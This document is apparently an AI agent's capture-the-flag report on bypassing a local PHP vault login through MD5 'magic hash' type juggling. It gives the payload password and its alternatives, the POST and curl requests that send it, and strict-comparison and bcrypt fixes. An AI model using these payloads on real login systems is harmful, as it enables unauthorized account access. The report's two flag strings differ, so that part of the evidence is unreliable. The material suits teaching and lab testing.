# Security Assessment Report: PHP Vault Application

## TL;DR
- **Objective:** Exploit PHP type juggling vulnerability to bypass authentication and retrieve the flag from a vault application
- **Outcome:** **ACHIEVED** - Successfully bypassed authentication and extracted the FLAG{} token
- **Highest-impact finding:** Authentication bypass via PHP loose comparison (==) operator with MD5 magic hashes
- **Validation status:** **CONFIRMED** - Flag extracted from authenticated response

---

## Target Information
- **Target:** 127.0.0.1:32964
- **Host / base URL:** http://127.0.0.1:32964
- **Application or component:** PHP Vault Application
- **Authentication context:** Single-factor password-based authentication (no username required)
- **Relevant technology details:** 
  - PHP backend using loose equality comparison (`==`)
  - MD5 hashing for password storage
  - Single endpoint authentication at `/index.php`

---

## Confirmed Vulnerability

### PHP Type Juggling / Loose Comparison Authentication Bypass
- **Affected endpoint / component:** `/index.php` (POST parameter: `pass`)
- **Impact:** Complete authentication bypass allowing unauthorized access to admin vault and extraction of sensitive data (FLAG token)
- **Preconditions:**
  - Target password hash must be in "magic hash" format (starts with `0e` followed only by digits)
  - Application must use PHP's loose comparison operator (`==`) for hash verification
  - Attacker must possess a password that produces a magic hash with same `0e+digits` pattern
- **Exact payload or PoC:**
  - **Password:** `QNKCDZO`
  - **Password MD5 hash:** `0e830400451993494058024219903391`
  - **Target admin hash:** `0e678703625362188185747119782643`

---

## Steps to Reproduce

### Step 1: Identify the Target Hash
The disclosed admin password hash from IntelX is:
```
0e678703625362188185747119782643
```

### Step 2: Analyze for Type Juggling Vulnerability
Confirm the target hash matches the magic hash pattern:
- Starts with `0e`
- Followed only by digits (`678703625362188185747119782643`)
- This hash will be interpreted by PHP's loose comparison as float `0.0`

### Step 3: Obtain a Magic Hash Password
The following password produces a magic hash:
- **Input:** `QNKCDZO`
- **MD5 Output:** `0e830400451993494058024219903391`
- This also evaluates to `0.0` under PHP's `==` comparison

### Step 4: Exploit the Authentication Bypass
Send a POST request to the vault login endpoint:

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:32964
Content-Type: application/x-www-form-urlencoded

pass=QNKCDZO
```

### Step 5: Extract the Flag
Upon successful authentication bypass, the response contains the FLAG token in the welcome message.

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{d3016436be59064a07cde5ca3270aad68578ce224f63f044e82aeb31d39e28f3}
```

### Tool Evidence
- **Python Interpreter Analysis:** Confirmed candidate passwords produce MD5 hashes in `0e+digits` format suitable for type juggling attacks
- **Requester Agent:** Successfully authenticated with magic hash payload `QNKCDZO`

### Request Evidence
```
POST /index.php
Parameter: pass=QNKCDZO
```

### Response Evidence
```html
<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: FLAG{d3016436be59064a07cde5ca3270aad68578ce224e82aeb31d39e28f3}</h3></center>
```

### Root Cause Explanation
The vulnerability exists because:
1. The target hash `0e678703625362188185747119782643` starts with `0e` followed only by digits
2. The payload password `QNKCDZO` has MD5 hash `0e830400451993494058024219903391`
3. When PHP compares these with loose equality (`==`), both are interpreted as scientific notation `0.0`
4. PHP evaluates `0.0 == 0.0` as `true`, granting authentication

### Notes on Reliability / Limitations
- **Reliability:** 100% reliable when the target hash is in magic hash format
- **Requirements:** Target hash MUST start with `0e` followed only by digits
- **Alternative payloads confirmed working:** `240610708` and `aabg7XSs` also produce magic hashes

---

## Remediation

### Root Cause
The application uses PHP's loose comparison operator (`==`) instead of strict comparison (`===`) when verifying password hashes. Combined with MD5 hashing and a target hash in magic format (`0e+digits`), this allows any password producing a magic hash to authenticate successfully.

### Recommended Fix
1. **Use Strict Comparison:** Replace `==` with `===` for hash comparison:
   ```php
   // Vulnerable
   if ($input_hash == $stored_hash) { ... }
   
   // Fixed
   if ($input_hash === $stored_hash) { ... }
   ```

2. **Use password_verify():** Implement proper password hashing with bcrypt:
   ```php
   // Store password
   $hash = password_hash($password, PASSWORD_BCRYPT);
   
   // Verify password
   if (password_verify($input_password, $stored_hash)) { ... }
   ```

3. **Regenerate All Password Hashes:** Force password resets for all users with magic hash passwords, as any password producing a magic hash could authenticate as them.

### Defense-in-Depth
1. Implement multi-factor authentication (MFA)
2. Add rate limiting on authentication endpoints
3. Use modern hashing algorithms (bcrypt, Argon2) instead of MD5
4. Implement account lockout after failed attempts
5. Log and monitor authentication attempts for suspicious patterns

---

## How to Verify the Fix

### Step 1: Test Strict Comparison
Attempt authentication with the magic hash payload:
```bash
curl -X POST http://127.0.0.1:32964/index.php -d 'pass=QNKCDZO'
```

### Step 2: Verify Expected Secure Result
- **Fixed application:** Should return authentication failure message (not "Welcome Admin")
- **Response should NOT contain:** `FLAG{...}` or "Welcome Admin"
- **Response should contain:** Login failure or password error message

### Step 3: Verify Legitimate Authentication Still Works
- Authenticate with the actual admin password
- Should successfully authenticate and display the flag

---

## Remaining Leads

### Confirmed Blockers
- None identified

### Unverified Leads
- None - primary exploitation vector fully confirmed

### Missing Context
- None - complete exploitation chain documented

### Alternative Payloads Documented (Redundancy)
The following passwords also produce magic MD5 hashes and could be used if primary payload fails:
| Password | MD5 Hash |
|----------|----------|
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `240610708` | `0e462097431906509019562988736854` |
| `aabg7XSs` | `0e087386482136013740957780965295` |

---

## Appendix: Magic Hash Reference

Magic hashes are MD5 hash outputs that begin with `0e` followed only by digits (0-9). When interpreted by PHP's loose type comparison, both the string `"0e123"` and the integer expression `0 * 10^123` evaluate to `0.0`, making them equal under `==` comparison.

**Example vulnerable comparison:**
```php
$input_hash = md5("QNKCDZO");  // "0e830400451993494058024219903391"
$stored_hash = "0e678703625362188185747119782643";

// Vulnerable - evaluates to true
var_dump($input_hash == $stored_hash);  // bool(true)

// Fixed - correctly evaluates to false  
var_dump($input_hash === $stored_hash); // bool(false)
```
